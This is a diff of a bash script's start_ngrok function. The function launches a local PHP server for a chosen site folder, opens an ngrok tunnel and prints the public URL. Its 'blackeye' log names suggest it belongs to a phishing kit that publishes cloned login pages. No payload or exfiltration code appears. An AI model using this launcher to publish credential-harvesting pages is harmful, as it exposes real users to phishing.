@@ -354,7 +354,12 @@ fi
 
 start_ngrok() {
 
-    # Find ngrok installed by the user
+    printf "\n"
+
+    # ---------------------------------------------------------
+    # 1. Find ngrok installed by the user
+    # ---------------------------------------------------------
+
     ngrok_bin="$(command -v ngrok)"
 
     if [[ -z "$ngrok_bin" ]]; then
@@ -363,7 +368,10 @@ start_ngrok() {
         return 1
     fi
 
-    # Check ngrok version
+    # ---------------------------------------------------------
+    # 2. Check ngrok version
+    # ---------------------------------------------------------
+
     ngrok_version="$("$ngrok_bin" version 2>/dev/null | awk '{print $3}')"
 
     if [[ -z "$ngrok_version" ]]; then
@@ -382,56 +390,130 @@ start_ngrok() {
     printf "\e[1;92m[*]\e[0m Using ngrok: %s\n" "$ngrok_bin"
     printf "\e[1;92m[*]\e[0m Version: %s\n" "$ngrok_version"
 
-    # Start your local test server in the background.
-    # Change 5555 if your lab server uses another port.
-    php -S 127.0.0.1:5555 >/tmp/lab-php.log 2>&1 &
+    # ---------------------------------------------------------
+    # 3. Start local PHP test server
+    # ---------------------------------------------------------
+
+    printf "\e[1;92m[*]\e[0m Starting PHP server...\n"
+
+    php_log="/tmp/blackeye-php.log"
+
+    (
+        cd "sites/$server" || exit 1
+        exec php -S 127.0.0.1:5555
+    ) >"$php_log" 2>&1 &
+
     php_pid=$!
 
+    # Give PHP a moment to start
     sleep 1
 
-    # Make sure PHP actually started
+    # Check that PHP is still running
     if ! kill -0 "$php_pid" 2>/dev/null; then
         printf "\e[1;91m[!]\e[0m PHP server failed to start.\n"
-        cat /tmp/lab-php.log
+        printf "\e[1;91m[!]\e[0m PHP output:\n"
+        cat "$php_log"
         return 1
     fi
 
+    # Check that the port actually responds
+    if ! curl -fsS http://127.0.0.1:5555 >/dev/null 2>&1; then
+        printf "\e[1;91m[!]\e[0m PHP server is running but port 5555 is not responding.\n"
+        printf "\e[1;91m[!]\e[0m PHP output:\n"
+        cat "$php_log"
+
+        kill "$php_pid" 2>/dev/null
+        return 1
+    fi
+
+    printf "\e[1;92m[*]\e[0m PHP server is ready on 127.0.0.1:5555\n"
+
+    # ---------------------------------------------------------
+    # 4. Start ngrok
+    # ---------------------------------------------------------
+
     printf "\e[1;92m[*]\e[0m Starting ngrok...\n"
 
-    "$ngrok_bin" http 127.0.0.1:5555 >/tmp/lab-ngrok.log 2>&1 &
+    ngrok_log="/tmp/blackeye-ngrok.log"
+
+    "$ngrok_bin" http 127.0.0.1:5555 >"$ngrok_log" 2>&1 &
+
     ngrok_pid=$!
 
-    # Wait for the ngrok API instead of using a fixed sleep
+    # ---------------------------------------------------------
+    # 5. Wait for ngrok API
+    # ---------------------------------------------------------
+
     ngrok_ready=false
+    tunnels_file="/tmp/blackeye-ngrok-tunnels.json"
 
     for i in {1..20}; do
-        if curl -fsS http://127.0.0.1:4040/api/tunnels >/tmp/ngrok-tunnels.json 2>/dev/null; then
+
+        if curl -fsS \
+            http://127.0.0.1:4040/api/tunnels \
+            >"$tunnels_file" 2>/dev/null; then
+
             ngrok_ready=true
+            break
+        fi
+
+        # Detect ngrok dying early
+        if ! kill -0 "$ngrok_pid" 2>/dev/null; then
             break
         fi
 
         sleep 1
     done
 
+    # ---------------------------------------------------------
+    # 6. Handle ngrok failure
+    # ---------------------------------------------------------
+
     if [[ "$ngrok_ready" != true ]]; then
+
         printf "\e[1;91m[!]\e[0m ngrok failed to start or its API is unavailable.\n"
+
         printf "\e[1;91m[!]\e[0m ngrok output:\n"
-        cat /tmp/lab-ngrok.log
-        kill "$php_pid" "$ngrok_pid" 2>/dev/null
+        cat "$ngrok_log"
+
+        kill "$php_pid" 2>/dev/null
+        kill "$ngrok_pid" 2>/dev/null
+
         return 1
     fi
 
-    # Extract the public URL
-    link="$(jq -r '.tunnels[0].public_url // empty' /tmp/ngrok-tunnels.json)"
+    # ---------------------------------------------------------
+    # 7. Extract public URL using jq
+    # ---------------------------------------------------------
+
+    link="$(jq -r '.tunnels[0].public_url // empty' "$tunnels_file")"
 
     if [[ -z "$link" ]]; then
-        printf "\e[1;91m[!]\e[0m ngrok is running but no public tunnel was returned.\n"
-        cat /tmp/ngrok-tunnels.json
+
+        printf "\e[1;91m[!]\e[0m ngrok API responded, but no public URL was returned.\n"
+
+        printf "\e[1;91m[!]\e[0m ngrok API response:\n"
+        cat "$tunnels_file"
+
+        kill "$php_pid" 2>/dev/null
+        kill "$ngrok_pid" 2>/dev/null
+
         return 1
     fi
 
-    printf "\e[1;92m[*]\e[0m Tunnel ready:\n"
-    printf "    %s\n" "$link"
+    # ---------------------------------------------------------
+    # 8. Success
+    # ---------------------------------------------------------
+
+    printf "\n"
+    printf "\e[1;92m[*]\e[0m ngrok tunnel is ready.\n"
+    printf "\e[1;92m[*]\e[0m Public URL: \e[1;77m%s\e[0m\n" "$link"
+    printf "\n"
+
+    # Keep these available to the rest of your program if needed.
+    NGROK_PID="$ngrok_pid"
+    PHP_PID="$php_pid"
+    NGROK_URL="$link"
 }
 echo ""
 echo ""
